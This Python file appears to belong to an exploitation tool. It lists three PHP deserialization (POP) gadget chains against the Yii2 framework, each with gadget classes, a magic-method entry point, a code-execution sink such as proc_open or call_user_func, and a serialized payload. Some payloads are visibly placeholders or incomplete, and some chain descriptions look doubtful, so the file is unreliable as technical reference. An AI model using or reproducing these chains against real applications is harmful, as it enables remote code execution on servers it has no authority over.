"""Yii/Yii2 POP chains (2.0.x)."""
from . import POPChain

YII_CHAINS: list = [
    POPChain(
        name="yii2_rce_batchquery",
        framework="Yii",
        gadget_classes=["yii\\db\\BatchQueryResult", "yii\\base\\Component"],
        entry_point="__destruct",
        sink="call_user_func(callback)",
        command_param="callback",
        serialize_code=r"""b'O:23:"yii\\db\\BatchQueryResult":1:{s:36:"\x00yii\\db\\BatchQueryResult\x00_dataReader";O:1:"F":2:{s:1:"a";i:1;s:1:"b";i:2;}}'""",
        notes="Yii2 BatchQueryResult::__destruct -> reset() -> __call -> call_user_func().",
    ),
    POPChain(
        name="yii2_rce_swagger_faker",
        framework="Yii",
        gadget_classes=["yii\\rest\\IndexAction", "Faker\\Generator"],
        entry_point="__toString",
        sink="proc_open(cmd)",
        command_param="cmd",
        serialize_code=r"""b'O:8:"YiiFaker":0:{}'""",
        notes="Yii 2.0.38+. IndexAction __toString -> Faker\\Generator format() -> proc_open().",
    ),
    POPChain(
        name="yii2_rce_callback",
        framework="Yii",
        gadget_classes=["yii\\base\\Object"],
        entry_point="__destruct",
        sink="call_user_func_array(callback)",
        command_param="callback",
        serialize_code=r"""b'O:12:"yii\\base\\Object":0:{}'""",
        notes="Yii2 generic Object::__destruct POP chain.",
    ),
]
